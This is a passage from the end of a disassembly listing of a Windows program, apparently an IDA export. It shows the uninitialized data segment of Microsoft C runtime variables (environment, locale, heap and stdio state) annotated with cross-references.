					; DoneRebootDlgProc(x,x,x,x)+58o ...
		align 4
		dd 82h dup(?)
; void *_aenvptr
__aenvptr	dd ?			; DATA XREF: _WinMainCRTStartup+11Bw
					; __setenvp:loc_10076C1r ...
__wenvptr	dd ?
___error_mode	dd ?			; DATA XREF: __amsg_exit+5r
					; _WinMainCRTStartup+D5r ...
dword_1010580	dd ?			; DATA XREF: __expandlocale+FCo
					; __expandlocale+161o
word_1010584	dw ?			; DATA XREF: __expandlocale+10Er
		align 4
dword_1010588	dd ?			; DATA XREF: __expandlocale+115w
					; __expandlocale+175r
; int errno
_errno		dd ?			; DATA XREF: __write+19Bw
					; __write:loc_100B0F5w	...
; unsigned __int32 _doserrno
__doserrno	dd ?			; DATA XREF: __write+1A5w
					; __write:loc_100B113w	...
__umaskval	dd ?
__osplatform	dd ?			; DATA XREF: _WinMainCRTStartup+29w
					; ___heap_selectr ...
; unsigned int _osver
__osver		dd ?			; DATA XREF: _WinMainCRTStartup+49w
					; _WinMainCRTStartup+5Aw
; unsigned int _winver
__winver	dd ?			; DATA XREF: _WinMainCRTStartup+65w
; unsigned int _winmajor
__winmajor	dd ?			; DATA XREF: _WinMainCRTStartup+32w
					; ___heap_select+9r ...
; unsigned int _winminor
__winminor	dd ?			; DATA XREF: _WinMainCRTStartup+3Aw
; int __argc
___argc		dd ?			; DATA XREF: __setargv+91w
; char **__argv
___argv		dd ?			; DATA XREF: __setargv+97w
; wchar_t **__wargv
___wargv	dd ?
; char **_environ
__environ	dd ?			; DATA XREF: __setenvp+54w
					; __setenvp:loc_100777Ar ...
___initenv	dd ?
; wchar_t **_wenviron
__wenviron	dd ?
___winitenv	dd ?
; char *_pgmptr
__pgmptr	dd ?			; DATA XREF: __setargv+39w
; wchar_t *_wpgmptr
__wpgmptr	dd ?
__exitflag	db ?			; DATA XREF: sub_10071A7+1Bw
					; ___endstdio+5r
		align 4
__C_Termination_Done dd	?		; DATA XREF: sub_10071A7+15w
__C_Exit_Done	dd ?			; DATA XREF: sub_10071A7+9r
					; sub_10071A7+7Dw
__adbgmsg	dd ?			; DATA XREF: __FF_MSGBANNER+21r
; void *_pxcptinfoptrs
__pxcptinfoptrs	dd ?			; DATA XREF: __XcptFilter+6Ar
					; __XcptFilter+75w ...
		align 8
; char Filename[260]
Filename	db 104h	dup(?)		; DATA XREF: __setargv+1Eo
byte_10106EC	db ?			; DATA XREF: __setargv+25w
		align 10h
dword_10106F0	dd ?			; DATA XREF: ___crtGetEnvironmentStringsA+8r
					; ___crtGetEnvironmentStringsA+26w ...
___lc_handle	dd 2 dup(?)
; LCID dword_10106FC
dword_10106FC	dd ?			; DATA XREF: _toupper+7r _toupper+9Dr	...
dword_1010700	dd ?			; DATA XREF: ___init_numeric+13r
					; ___init_monetary+6r ...
dword_1010704	dd ?			; DATA XREF: ___init_numeric+Ar
					; ___init_numeric+67r ...
dword_1010708	dd ?			; DATA XREF: ___init_timer
; UINT __lc_codepage
___lc_codepage	dd ?			; DATA XREF: _toupper+87r
					; sub_1006C05+D4r ...
___lc_collate_cp dd ?			; DATA XREF: sub_1006C05+213w
dword_1010714	dd ?			; DATA XREF: ___crtLCMapStringA+Er
					; ___crtLCMapStringA+31w ...
; void *__lc_time_intl
___lc_time_intl	dd ?			; DATA XREF: ___init_time:loc_1008A62r
					; ___init_time+4Cr ...
; void *__lconv_intl
___lconv_intl	dd ?			; DATA XREF: ___init_numeric+26r
					; ___init_numeric+36w ...
dword_1010720	dd ?			; DATA XREF: _GetLcidFromDefaultw
					; LocaleEnumProc+40w ...
; LCID Locale
Locale		dd ?			; DATA XREF: _GetLcidFromDefault+14w
					; LocaleEnumProc+76w ...
dword_1010728	dd ?			; DATA XREF: _GetLcidFromDefault+Fw
					; sub_1009299:loc_10092ECr ...
dword_101072C	dd ?			; DATA XREF: sub_100959B+77r
					; sub_100959B+14Dr ...
dword_1010730	dd ?			; DATA XREF: LocaleEnumProc+21r
					; sub_100959B+21r ...
; char *Str1
Str1		dd ?			; DATA XREF: LocaleEnumProc+4Dr
					; sub_100959B+52r ...
; size_t MaxCount
MaxCount	dd ?			; DATA XREF: sub_100959B+C3r
					; sub_100959B+101r ...
; char *dword_101073C
dword_101073C	dd ?			; DATA XREF: sub_1009521+43r
					; sub_100959B+98r ...
dword_1010740	dd ?			; DATA XREF: sub_1009299+59r
					; LocaleEnumProc+36r ...
dword_1010744	dd ?			; DATA XREF: ___crtGetStringTypeA+Er
					; ___crtGetStringTypeA+2Ew ...
___lc_id	dd 3 dup(?)
word_1010754	dw ?			; DATA XREF: ___init_ctype+29r
		align 4
		dd ?
word_101075C	dw ?			; DATA XREF: ___init_monetary+63r
		align 10h
		db 2 dup(?)
word_1010762	dw ?			; DATA XREF: ___init_numeric+74r
		db 2 dup(?)
word_1010766	dw ?			; DATA XREF: sub_100851F+9r
word_1010768	dw ?			; DATA XREF: sub_100851F+10r
		align 4
dword_101076C	dd ?			; DATA XREF: ___crtMessageBoxA+Br
					; ___crtMessageBoxA+3Aw ...
dword_1010770	dd ?			; DATA XREF: ___crtMessageBoxA+4Fw
					; ___crtMessageBoxA:loc_1009EC6r
dword_1010774	dd ?			; DATA XREF: ___crtMessageBoxA+5Dw
					; ___crtMessageBoxA+D8r
dword_1010778	dd ?			; DATA XREF: ___crtMessageBoxA+7Dw
					; ___crtMessageBoxA:loc_1009E81r
dword_101077C	dd ?			; DATA XREF: ___crtMessageBoxA+6Ew
					; ___crtMessageBoxA+9Er
dword_1010780	dd ?			; DATA XREF: __setmbcp+1Bw
					; __setmbcp+23w ...
		align 8
dword_1010788	dd ?			; DATA XREF: __ValidateEH3RN:loc_100AD7Cr
					; __ValidateEH3RN+142r	...
		align 10h
dword_1010790	dd ?			; DATA XREF: __ValidateEH3RN:loc_100AD8Fr
					; __ValidateEH3RN+1C7r	...
		dd 0Fh dup(?)
; volatile LONG	Target
Target		dd ?			; DATA XREF: __ValidateEH3RN+12Fo
					; __ValidateEH3RN+194o	...
__cflush	dd ?
; int (__cdecl *_pnhHeap)(unsigned int)
?_pnhHeap@@3P6AHI@ZA dd	?		; DATA XREF: __callnewh+5r
; int _newmode
__newmode	dd ?			; DATA XREF: _malloc+5r
					; _calloc:loc_100B74Cr
; WCHAR	WideCharStr
WideCharStr	dd 2 dup(?)		; DATA XREF: ___getlocaleinfo+FCo
___lconv_static_null dd	?		; DATA XREF: ___getlocaleinfo+14Eo
					; .data:off_100E7E4o ...
dword_10107EC	dd ?			; DATA XREF: ___crtGetLocaleInfoW+11r
					; ___crtGetLocaleInfoW+27w ...
dword_10107F0	dd ?			; DATA XREF: ___crtGetLocaleInfoA+Er
					; ___crtGetLocaleInfoA+27w ...
		dd 30h dup(?)
___piob		dd ?			; DATA XREF: ___initstdio+2Bw
					; ___initstdio+44w ...
		align 10h
__bufin		dd 400h	dup(?)		; DATA XREF: .data:__iobo
					; .data:0100E480o
; size_t _nstream
__nstream	dd ?			; DATA XREF: ___initstdior
					; ___initstdio:loc_100B149w ...
; void *__sbh_pHeaderDefer
___sbh_pHeaderDefer dd ?		; DATA XREF: ___sbh_heap_init+26w
					; ___sbh_free_block+21Er ...
___sbh_cntHeaderList dd	?		; DATA XREF: ___sbh_heap_init+2Dw
					; ___sbh_find_block+5r	...
; LPVOID __sbh_pHeaderList
___sbh_pHeaderList dd ?			; DATA XREF: ___sbh_heap_init+1Aw
					; ___sbh_find_block+Dr	...
___sbh_threshold dd ?			; DATA XREF: __heap_alloc+12r
					; ___sbh_heap_init+3Bw	...
___sbh_pHeaderScan dd ?			; DATA XREF: ___sbh_heap_init+34w
					; ___sbh_free_block+302w ...
___sbh_sizeHeaderList dd ?		; DATA XREF: ___sbh_heap_init+41w
					; ___sbh_alloc_new_region+5r ...
___sbh_indGroupDefer dd	?		; DATA XREF: ___sbh_free_block+22Br
					; ___sbh_free_block+24Br ...
; LCID __mblcid
___mblcid	dd ?			; DATA XREF: sub_1009F87+1Cw
					; sub_1009FB7+8Fr ...
___ismbcodepage	dd ?			; DATA XREF: sub_1009F87+17w
					; __setmbcp+14Fw ...
		dd 6 dup(?)
; unsigned __int8 _mbctype[]
__mbctype	db ?			; DATA XREF: sub_1009F87+8o
					; __setmbcp+A9o ...
byte_1011901	db ?			; DATA XREF: sub_1007796+49r
					; sub_1007796+11Fr ...
		align 4
		dd 40h dup(?)
; UINT __mbcodepage
___mbcodepage	dd ?			; DATA XREF: sub_1009F87+12w
					; sub_1009FB7+1Br ...
		align 10h
___mbulinfo	dd 4 dup(?)		; DATA XREF: sub_1009F87+21o
					; __setmbcp+164o ...
; unsigned __int8 _mbcasemap[]
__mbcasemap	db ?			; DATA XREF: sub_1009FB7:loc_100A0D4w
					; sub_1009FB7:loc_100A0F1w ...
		align 4
		dd 3Fh dup(?)
; void *__ctype1
___ctype1	dd ?			; DATA XREF: ___init_ctype:loc_1009039r
					; ___init_ctype+15Ew ...
; HANDLE _crtheap
__crtheap	dd ?			; DATA XREF: __heap_init+1Dw
					; __heap_init+42r ...
___active_heap	dd ?			; DATA XREF: __heap_init+2Cw _free+Dr	...
; UINT _nhandle
__nhandle	dd ?			; DATA XREF: __ioinit+21w
					; __ioinit:loc_1007B69r ...
		dd 4 dup(?)
___pioinfo	dd ?			; DATA XREF: __ioinit:loc_1007AFBw
					; __ioinit+3Er	...
dword_1011B44	dd 3Fh dup(?)		; DATA XREF: __ioinit+92o
___env_initialized dd ?			; DATA XREF: __setenvp+BAw
___onexitend	dd ?			; DATA XREF: sub_10071A7+2Dr
					; sub_10071A7:loc_10071E8r ...
___onexitbegin	dd ?			; DATA XREF: sub_10071A7+23r
					; sub_10071A7+49r
___mbctype_initialized dd ?		; DATA XREF: __wincmdlnr __setenvp+5r	...
__FPinit	dd ?			; DATA XREF: __cinitr
__acmdln	dd ?			; DATA XREF: _WinMainCRTStartup+111w
					; __wincmdln+Fr ...
		align 400h
_data		ends


		end _WinMainCRTStartup
